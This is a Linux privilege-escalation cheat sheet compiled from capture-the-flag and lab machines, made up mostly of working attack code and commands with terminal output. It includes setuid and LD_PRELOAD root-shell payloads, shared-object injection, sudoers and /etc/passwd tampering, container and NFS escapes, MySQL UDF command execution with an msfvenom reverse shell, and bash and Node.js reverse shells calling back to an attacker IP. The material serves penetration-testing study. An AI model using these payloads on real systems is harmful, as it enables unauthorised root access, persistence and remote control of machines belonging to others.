# Privilege Escalation (Linux)

<details>

<summary>Automated Tools</summary>

* Linpeas

```bash
wget http://10.11.67.208:8023/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

```bash
ssh -p 3306 user@challenge.nahamcon.com < linpeas.sh
```

* unix-privesc-check

<pre><code><strong>./unix-privesc-check standard > output.txt
</strong></code></pre>

</details>

### Enumeration

<details>

<summary>Basic System Info</summary>

* Find info about current user

```bash
id
```

* History

```bash
history
```

```bash
cat .bash_history
```

* To find which commands the user can run as sudo

<pre class="language-bash"><code class="lang-bash"><strong>sudo -l
</strong></code></pre>

* Find Kernel version (eg: 4.9.0-6-686)

```bash
uname -a
```

</details>

<details>

<summary>Services</summary>

* Find running services
  * `grep root` to find processes running as root

```bash
ps aux
```

```bash
ps -ef | grep vnc
```

* Find Scheduled Tasks
  * Scheduled tasks are listed under the /etc/cron.\* directories.
  * System administrators often add their own scheduled tasks in the /etc/crontab file

```bash
grep "CRON" /var/log/cron.log
```

```bash
ls -lah /etc/cron*
```

```bash
/etc/crontab
```

</details>

<details>

<summary>Network</summary>

* Network interfaces

```bash
ip a
```

* All network connections

```bash
ss -antlp
```

* Arp Cache
  * REACHABLE --> Connection is very recent
  * PERMANENT --> Entry manually added to arp table as static entry
  * DELAY/STALE --> Connection hasn't been recently verified
  * INCOMPLETE --> Addr resolution still in progress
  * FAILED--> System can't be reached

```bash
ip neigh
```

```bash
arp -a
```

* Find Routing Table

```bash
/sbin/route
```

* Finding Firewall Rules (non-root)
  * Could potentially view the backup firewall rules file

```bash
grep -Hs iptables /etc/*
```

\-H: show filename, -s: supress errors

* Finding Firewall Rules (root)

<pre class="language-bash"><code class="lang-bash"><strong>sudo iptables -L -v -n | more
</strong></code></pre>

* List all drives mounted at boot time

```bash
cat /etc/fstab
```

</details>

<details>

<summary>Users &#x26; Groups</summary>

* Check `/home` directory
* To find other accounts that are present

```bash
cat /etc/passwd
```

* Find which user has valid shell

```bash
grep -vE "nologin|false" /etc/passwd
```

</details>

<details>

<summary>Files &#x26; Directories</summary>

* SUID Files

```bash
find / -perm -u=s -type f 2>/dev/null
```

* Config Files

```bash
/etc/phpmysadmin/config-db.php
```

```bash
/var/www/html/wordpress/wp-config.php
```

```bash
/srv/http/wp-config.php
```

* Find every directory writable by current user

```bash
find / -writable -type d 2>/dev/null
```

* Find RSA keys

```bash
find / -name id_rsa
```

```bash
find / -name authorized_keys
```

* Find Installed Apps
  * For Debian based OSs:

```bash
dpkg -l
```

* Will only show apps installed by dpkg
  * For CentOS / openSUSE:

```bash
rpm -qa
```

</details>

<details>

<summary>Further Hardware Enumeration</summary>

* CPU Info (Architecture, Threads, Cores)
  * Some exploits require specific number of cores.

```bash
lscpu
```

* Enumerate the loaded kernel modules

```bash
lsmod
```

* Find out more about a specific kernel module
  * modinfo requires a full pathname to run.&#x20;
  * eg of \<kernel\_module\_name> : libata

```bash
/sbin/modinfo <kernel_module_name>
```

</details>

<details>

<summary>Password Hunting</summary>

```bash
cd <dir with suspicious files>
grep -R -i "connection" . 
grep -R -i "password" .
```

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```

```bash
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

</details>

<details>

<summary>Find Out About What Shells Are Present</summary>

```bash
cat /etc/shells
```

</details>

### Methods

<details>

<summary>Old Versions of Linux</summary>

* Check if `pkexec` is present
* If so, can try pwnkit
* [Vuln affects all versions of pkexec since its first version in 2009](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)

[https://github.com/ly4k/PwnKit/blob/main/PwnKit](https://github.com/ly4k/PwnKit/blob/main/PwnKit)

</details>

<details>

<summary>Kernel Exploits</summary>

* Search for exploits targetting specific kernel versions

```bash
uname -a
```

* Try to compile the exploits on the target, if possible (`gcc -V`)

<!---->

* No gcc, or missing lib: run `ldd --version` on the target and try to get a docker container with the same libc installed, compile from there and transfer to target

[https://github.com/Snoopy-Sec/Localroot-ALL-CVE](https://github.com/Snoopy-Sec/Localroot-ALL-CVE)

[https://github.com/lucyoa/kernel-exploits/tree/master](https://github.com/lucyoa/kernel-exploits/tree/master)

### Recommended Kernel Exploits:

* FreeBSD 9.0: [https://www.exploit-db.com/exploits/28718](https://www.exploit-db.com/exploits/28718)
* Ubuntu 16.04: [https://www.exploit-db.com/exploits/39772](https://www.exploit-db.com/exploits/39772)
* Linux 2.6.9-89.EL: [https://www.exploit-db.com/exploits/9545](https://www.exploit-db.com/exploits/9545)
* Linux beta 3.0.0-12-generic: [https://gist.github.com/karthick18/1686299](https://gist.github.com/karthick18/1686299)
* Linux Kernel 2.6.39 to 3.2.2 (x86/x64) - 'Mempodipper' - [https://www.exploit-db.com/exploits/35161](https://www.exploit-db.com/exploits/35161)
* Linux core 2.6.32-21: [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)

### Linux Binaries

* Basic syntax

```bash
gcc cowroot.c -o
```

* 32 bit env

```bash
gcc -m32 -march=i686 code.c -o exp -static
```

* 64 bit env

```bash
gcc -m64 input.c -o output
```

### Windows Binaries

* 32 bit env

```bash
i686-w64-mingw32-gcc -o main32.exe main.c
```

* 64 bit env

```bash
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

### Python to EXE

```
pyinstaller --onefile test.py
```

* will save in `dist` folder

</details>

<details>

<summary>SUDO Version</summary>

### Version 1.8.31

```bash
git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git

make
chmod +x exploit
./exploit 
```

</details>

<details>

<summary>sudo -l</summary>

#### `(ALL, !root) NOPASSWD`

[sudo 1.8.27 - Security Bypass](https://www.exploit-db.com/exploits/47502)

#### `(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

1. Put library in current directory&#x20;
2. `sudo -u rabbit` to run as rabbit user
3. `(ALL) SETENV: /usr/bin/python3.7 /tmp/hijack.py`
4. `python3 -c 'import sys; print("\n".join(sys.path))'` –> to view the Python Path (look for broken privileges)

If can run `/bin/chmod` and `/bin/chown` as sudo,&#x20;

* Create `setuid.c`

```c
int main()
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

* `gcc setuid.c -o setuid`
* `sudo /bin/chown root:root /opt/lcdelastix/setuid`
* `sudo chmod 4755 /opt/lcdelastix/setuid`

#### LD\_PRELOAD

In sudoers file,

```
Defaults        env_keep += LD_PRELOAD
```

shell.c :

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Executing binary with LD\_PRELOAD set to obtain root shell:

```bash
sudo LD_PRELOAD=/tmp/shell.so find
```

</details>

<details>

<summary>SUID/SGID bit</summary>

A file with SUID always executes as the user who owns the file, regardless of the user passing the command.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

[GTFObins](https://gtfobins.github.io/)

#### Eg : aria2c

* Copy out victim's `/etc/passwd`
* Edit root's password hash in `/etc/passwd`
* Must be in victim's`/etc` directory

```bash
/usr/bin/aria2c -o passwd "http://192.168.45.5/passwd" --allow-overwrite=true
```

Shared Object Injection Example:

```bash
strace /usr/local/bin/suid_so 2>&1 | grep -i -E "open|access|no such file"
```

* look for sus `.so` file (eg: `/home/user/.config/llibcalc.so`)

`libcalc.c`

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p";
}
```

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
```

</details>

<details>

<summary>Cron Jobs</summary>

### Discovering Cronjob

```bash
cat /etc/crontab
```

```bash
ls -lah /etc/cron*
```

```bash
./pspy64
```

![](<../.gitbook/assets/image (195).png>)

#### Example (Tar Wildcard PrivEsc):

* Cronjob eg:

```bash
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

* PrivEsc:

```bash
cd /home/andre/backup
```

```bash
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > backup.sh
```

```bash
chmod +x backup.sh
```

```bash
touch /home/andre/backup/--checkpoint=1
```

```bash
touch "/home/andre/backup/--checkpoint-action=exec=sh backup.sh"
```

```bash
/tmp/bash -p
```

### Exiftool > v7.44

[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/#arbitrary-code-execution-(cve-2021-22204)-version-7.44%2B](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/#arbitrary-code-execution-\(cve-2021-22204\)-version-7.44%2B)

```bash
#Cronjob
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /etc/crontab
…
* *	* * *	root	bash /opt/image-exif.sh

www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /opt/image-exif.sh 
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"


```

```bash
#Check Version
www-data@exfiltrated:/var/www/html/subrion/uploads$ exiftool -ver
11.88

┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.206.163]
└─# cat jpg
(metadata "\c${system('chmod +s /bin/bash')};")

┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.206.163]
└─# bzz jpg jpg.bzz                                         
                                                                                                                             
┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.206.163]
└─# djvumake jpg.djvu INFO='1,1' BGjp=/dev/null ANTz=jpg.bzz

┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.206.163]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.206.163 - - [04/May/2023 06:09:55] "GET /jpg.djvu HTTP/1.1" 200 -

www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.5/jpg.djvu
--2023-05-04 10:09:55--  http://192.168.45.5/jpg.djvu
Connecting to 192.168.45.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 102 [image/vnd.djvu]
Saving to: ‘jpg.djvu’

jpg.djvu            100%[===================>]     102  --.-KB/s    in 0s      

2023-05-04 10:09:55 (212 KB/s) - ‘jpg.djvu’ saved [102/102]

www-data@exfiltrated:/var/www/html/subrion/uploads$ chmod 777 jpg.djvu 
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ /bin/bash -p
bash-5.0# whoami
root
```

</details>

<details>

<summary>Binary with SUID Bit Set</summary>

```bash
/home/joe/live_logs
```

```bash
strings /home/joe/live_logs –> output is “tail /var/log/nginx/access.log”
```

```bash
echo "/bin/bash" > /tmp/tail
```

```bash
export PATH=/tmp:$PATH
```

```bash
echo $PATH
```

#### To obtain root shell

```bash
/home/joe/live_logs
```

</details>

<details>

<summary>Writable /etc/passwd File</summary>

#### Generate the hash of a new password

* Don't put special chars pls

```bash
openssl passwd <new_password>
```

#### In /etc/passd

* Insert the hash between the first and second colons of the root user

```bash
root:$1$5qwaBRuZ$UVaeTUIqUmpqSqdn62We6.:0:0:root:/root:/bin/bash
```

Generally, password hashes are saved in `/etc/shadow` (can't be read by normal users). However, password hashes were previously saved in `/etc/passwd/. So,`for backward compatibility, `etc/passwd` has precedence over `/etc/shadow`.&#x20;

#### Change to root user

```
su root
```

</details>

<details>

<summary>File Write to Root</summary>

### Write to /etc/sudoers

```bash
[root@nukem .ssh]# echo "bill ALL=(ALL) ALL" >> /etc/sudoers
```

```bash
[bill@nukem root]$ sudo -l
[sudo] password for bill: 
Runas and Command-specific defaults for bill:
    Defaults!/etc/ctdb/statd-callout !requiretty

User bill may run the following commands on nukem:
    (ALL) ALL
[bill@nukem root]$ sudo -i 
[root@nukem ~]# whoami
root
```

### Dosbox SUID

#### Simpler Method:

[https://gtfobins.github.io/gtfobins/dosbox/#suid](https://gtfobins.github.io/gtfobins/dosbox/#suid)

```bash
dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >>c:\etc\sudoers" -c exit
sudo -i
```

### Longer Method:

#### In Dosbox emulator:

```bash
Z:\> mount k /
Z:\> k:
k:\> cd etc
k:\> echo commander ALL=(ALL) ALL >> sudoers
```

#### In Victim:

```bash
[commander@nukem simple-file-list]$ sudo -l
[sudo] password for commander: 
Runas and Command-specific defaults for commander:
    Defaults!/etc/ctdb/statd-callout !requiretty

User commander may run the following commands on nukem:
    (ALL) ALL
[commander@nukem simple-file-list]$ sudo bash -i
[root@nukem simple-file-list]# whoami
root
```

</details>

<details>

<summary>Docker</summary>

If `.dockerenv` is present in `/` directory&#x20;

OR if user is in docker group (`id`)

```bash
eleanor@peppo:/var/tmp$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        2 years ago         542MB
postgres            latest              adf2b126dda8        2 years ago         313MB

eleanor@peppo:/var/tmp$ docker run -it -v /:/host/ redmine chroot /host/ bash
# docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
root@2df1ba0ecbb5:/ chmod +s /bin/bash
root@2df1ba0ecbb5:/ exit
eleanor@peppo:/var/tmp$ /bin/bash -p
bash-4.4# whoami
root
```

</details>

<details>

<summary>Network File Sharing (NFS)</summary>

Victim: `cat /etc/exports` (`no_root_squash`) present → create executable with SUID)

Attacker: `showmount -e 10.10.44.226`

Attacker: `mount -o rw 10.10.44.226:/tmp /home/kali/Documents/tryhackme/linprivesc/tmp`

Attacker: Create the `nfs.c`

```c
int main()
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Attacker: `gcc nfs.c -o nfs -w`

Attacker: `chmod +s nfs`

Victim: `cd /tmp; ./nfs`

</details>

<details>

<summary>id</summary>

1. Install [System container image builder](https://github.com/lxc/distrobuilder) on attacker
2. `make`
3. `cd $HOME/ContainerImages/alpine/; wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml`
4. `sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8`
5. Upload lxd.tar.xz and rootfs.squashfs to victim
6. `lxc image import lxd.tar.xz rootfs.squashfs --alias alpine`
7. `lxc image list`
8. `lxc init alpine privesc -c security.privileged=true`
9. `lxc list`
10. `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
11. `lxc start privesc`
12. `lxc exec privesc /bin/sh`
13. `chmod +s /mnt/root/bin/bash`
14. `exit`
15. `/bin/bash -p`

If `Error: No storage pool found.` –> run `lxd init` and repeat the steps.

</details>

<details>

<summary>Python Module Import Hijacking</summary>

Leveraging on the use of importing modules from scripts (eg: Sudo Python scripts or Cron jobs)

### Default Path for Python Library Searching

```bash
    1. Directory where script is executed
    2. /usr/lib/python2.7
    3. /usr/lib/python2.7/plat-x86_64-linux-gnu
    4. /usr/lib/python2.7/lib-tk
    5. /usr/lib/python2.7/lib-old
    6. /usr/lib/python2.7/lib-dynload
    7. /usr/local/lib/python2.7/dist-packages
    8. /usr/lib/python2.7/dist-packages
```

#### To find out the paths

```bash
python -c 'import sys; print "\n".join(sys.path)'
```

### Example:

#### Able to run as sudo (sudo /usr/bin/python /home/walter/wifi\_reset.py)

```python
import wificontroller

wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificontroller.start("wlan0", "1")
```

#### Create wificontroller.py (in the same directory as the python script that's able to run as sudo)

```python
import os

def stop(a,b):
	os.system("chmod +s /bin/bash")

```

#### Run the script as sudo to obtain root!

```bash
www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
Traceback (most recent call last):
  File "/home/walter/wifi_reset.py", line 12, in <module>
    wificontroller.reset("wlan0", "1")
www-data@walla:/home/walter$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
www-data@walla:/home/walter$ /bin/bash -p
bash-5.0# whoami
root

```

</details>

<details>

<summary>sudo sudo -v </summary>

sudo versions: legacy v1.8.2-1.8.31p2 , stable v1.9.0-1.9.5p1

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)') 
```

If `malloc(): memory corruption` means exploitable to [Baron Samedit](https://github.com/blasty/CVE-2021-3156)

```bash
cat /etc/*release
```

```bash
./sudo-hax-me-a-sandwich 0
```

</details>

<details>

<summary>Capabilities</summary>

more granular privilege management

```
getcap -r / 2>/dev/null
```

</details>

<details>

<summary>Shared Object Files || LD_LIBRARY_PATH</summary>

[https://tbhaxor.com/exploiting-shared-library-misconfigurations/](https://tbhaxor.com/exploiting-shared-library-misconfigurations/)

### SUID Shared Object Exploit:

#### From linpeas:

\-rwsr-xr-x 1 root root 17K Jan 26  2021 /usr/bin/messenger (Unknown SUID binary)

* Exploit.c (For SUID shared object exploit)

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}
```

```bash
gcc -shared -fPIC -nostartfiles -o libmalbec.so exploit.c
chmod +x libmalbec.so
```

<pre class="language-bash"><code class="lang-bash"><strong>carlos@malbec:/home/carlos$ /usr/bin/messenger
</strong>/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory

carlos@malbec:/home/carlos$ ldd /usr/bin/messenger
	linux-vdso.so.1 (0x00007ffd7da8f000)
	libmalbec.so => not found
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f97104f8000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f97106ce000)

carlos@malbec:/home/carlos$ cat /etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

carlos@malbec:/etc/ld.so.conf.d$ cat malbec.conf
/home/carlos/

#This means that we have to put libmalbec.so in /home/carlos for /usr/bin/mesenger to execute it!

┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.159.129]
└─# cat exploit.c     
#include &#x3C;stdlib.h>
#include &#x3C;unistd.h>

void _init() {
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}

┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.159.129]
└─# gcc -shared -fPIC -nostartfiles -o libmalbec.so exploit.c

┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.159.129]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.159.129 - - [29/Apr/2023 06:10:44] "GET /libmalbec.so HTTP/1.1" 200 -

carlos@malbec:/home/carlos$ wget http://192.168.45.5/libmalbec.so
--2023-04-29 06:07:44--  http://192.168.45.5/libmalbec.so
Connecting to 192.168.45.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14104 (14K) [application/octet-stream]
Saving to: ‘libmalbec.so’

libmalbec.so        100%[===================>]  13.77K  54.5KB/s    in 0.3s    

2023-04-29 06:07:44 (54.5 KB/s) - ‘libmalbec.so’ saved [14104/14104]

carlos@malbec:/home/carlos$ chmod +x libmalbec.so
carlos@malbec:/home/carlos$ /usr/bin/messenger
root@malbec:/home/carlos# whoami
root

</code></pre>

### CronJob Shared Object Exploit:

#### From Linpeas:

```bash
LD_LIBRARY_PATH=...:/usr/local/lib/dev:...

*  *  *  *  * root       /usr/bin/log-sweeper
```

* exp.c (For Cronjob Shared Object Exploit)

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```bash
gcc -shared -fPIC -nostartfiles -o utils.so exp.c
chmod +x utils.so
```

<pre class="language-bash"><code class="lang-bash"><strong># From Linpeas
</strong>PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""


*  *  *  *  * root       /usr/bin/log-sweeper
<strong>
</strong><strong>[pablo@sybaris ~]$  /usr/bin/log-sweeper
</strong>/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory

# finding writable path in LD_LIBRARY_PATH:
[pablo@sybaris ~]$ ls -la /usr/local/lib/dev/
total 0
drwxrwxrwx  2 root root  6 Sep  7  2020 .
drwxr-xr-x. 4 root root 30 Sep  7  2020 ..

[pablo@sybaris dev]$ cat exp.c
#include &#x3C;stdio.h>
#include &#x3C;stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash &#x26;&#x26; chmod +s /tmp/bash &#x26;&#x26; /tmp/bash -p");
}

[pablo@sybaris dev]$ gcc -shared -fPIC -nostartfiles -o utils.so exp.c
[pablo@sybaris dev]$ chmod +x utils.so

[pablo@sybaris dev]$ ls -la /tmp
total 944
drwxrwxrwt.  9 root root    261 May  1 22:23 .
dr-xr-xr-x. 17 root root    244 Sep  4  2020 ..
-rwsr-sr-x   1 root root 964536 May  1 22:23 bash

[pablo@sybaris dev]$ /tmp/bash -p
bash-4.2# whoami
root
</code></pre>

</details>

<details>

<summary>raptor_udf2.so</summary>

Versions tried on:&#x20;

* 10.3.17-MariaDB
* 5.0.77 MySQL
* 5.7.30 MySQL

On Kali:

* Try compiling with`-m32` for 32bit machines

```bash
searchsploit -m 1518
mv 1518.c raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=80 -f elf > non_staged.elf
```

On Victim's machine:

```bash
wget http://192.168.45.214/raptor_udf2.so
wget http://192.168.45.214/non_staged.elf
```

On MariaDB server:

* For MySQL server, change the dumpfile to&#x20;
  * `/usr/lib/raptor_udf2.so`
  * `/usr/lib/mysql/plugin/raptor_udf2.so`

```sql
create database poc;
use poc;
create table foo(line blob);
insert into foo values(load_file('/home/mario/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('/home/mario/non_staged.elf');
```

* If `ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so' (errno: 0 /usr/lib/mysql/plugin/raptor_udf2.so: file too short)` --> simply copy the static object file into the MySQL plugins folder using Bash.&#x20;

```bash
mysql> create database poc;
mysql> use poc;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/var/tmp/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
#ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so' (errno: 0 /usr/lib/mysql/plugin/raptor_udf2.so: file too short)
mysql> \! cp /var/tmp/raptor_udf2.so /usr/lib/mysql/plugin/raptor_udf2.so
mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.01 sec)
mysql> select * from mysql.func;
mysql> select do_system('chmod +s /bin/bash');
```

* [https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf](https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf)

</details>

<details>

<summary>Webmin To Root</summary>

* Generate Reverse shell payload

```bash
cp /usr/share/webshells/perl/perl-reverse-shell.pl .
```

```bash
wget http://192.168.45.190/perl-reverse-shell.pl -O rev.cgi
```

* Use [https://github.com/CyberKnight00/Exploit/blob/master/Webmin%20%3C%201.290%20Usermin%20%3C%201.220%20-%20Arbitrary%20File%20Disclosure/webmin.py](https://github.com/CyberKnight00/Exploit/blob/master/Webmin%20%3C%201.290%20Usermin%20%3C%201.220%20-%20Arbitrary%20File%20Disclosure/webmin.py)

```bash
python2 webmin.py -r http --host 10.11.1.141 -p 10000 -f /var/tmp/rev.cgi
```

</details>

<details>

<summary>Lateral Movement using Postfix Disclaimer</summary>

[https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze)

When any of the emails included in `/etc/postfix/disclaimer_addresses/etc/postfix/disclaimer_addresses` send/receive an email --> `/etc/postfix/disclaimer` file will be executed

<pre class="language-bash"><code class="lang-bash">brian.moore@postfish:/var/tmp$ id
... 997(filter)

In Linpeas output:
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxrwx--- 1 root filter 1184 Apr 29 06:30 /etc/postfix/disclaimer

brian.moore@postfish:/var/tmp$ cat /etc/postfix/disclaimer_addresses
it@postfish.off
brian.moore@postfish.off

<strong>Placing our reverse shell in /etc/postfix/disclaimer at line 3:
</strong>bash -i >&#x26; /dev/tcp/192.168.45.5/80 0>&#x26;1

┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.159.137]
└─# nc 192.168.159.137 25
220 postfish.off ESMTP Postfix (Ubuntu)
HELO postfish.off
250 postfish.off
MAIL FROM:it@postfish.off
250 2.1.0 Ok
RCPT TO:brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with &#x3C;CR>&#x3C;LF>.&#x3C;CR>&#x3C;LF>
FROM: it@postfish.off
To: brian.moore@postfish.off
Date: sat, 29 Apr 2023 12:00:00 +0000

shell please!!!
.
250 2.0.0 Ok: queued as 8A96C458E6

┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.159.137]
└─# nc -lvp 80 
listening on [any] 80 ...
connect to [192.168.45.5] from postfish.off [192.168.159.137] 49704
bash: cannot set terminal process group (36932): Inappropriate ioctl for device
bash: no job control in this shell
filter@postfish:/var/spool/postfix$ whoami
whoami
filter

</code></pre>

</details>

<details>

<summary>Node Modules Cronjob</summary>

### Cronjob:

```bash
* * * * * sebastian /home/sebastian/audit.js
```

```bash
www-data@charlotte:/var/tmp$ cat /home/sebastian/audit.js
#!/usr/bin/env node
...
const auditData = require("/var/www/node/package");
```

NodeJS documentation: if exact filename not found then filename with .js, .json, .node will be loaded.

### Creating /var/www/node/package.js

```javascript
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(53, "192.168.45.5", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
```

### Rev Shell

```bash
┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.159.184]
└─# nc -lvp 53 
listening on [any] 53 ...
192.168.238.184: inverse host lookup failed: Unknown host
connect to [192.168.45.5] from (UNKNOWN) [192.168.238.184] 35226
whoami
sebastian
```

</details>

### Resources

<details>

<summary>Links</summary>

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

[BeRoot Guide](https://github.com/AlessandroZ/BeRoot/blob/master/Linux/README.md)

</details>

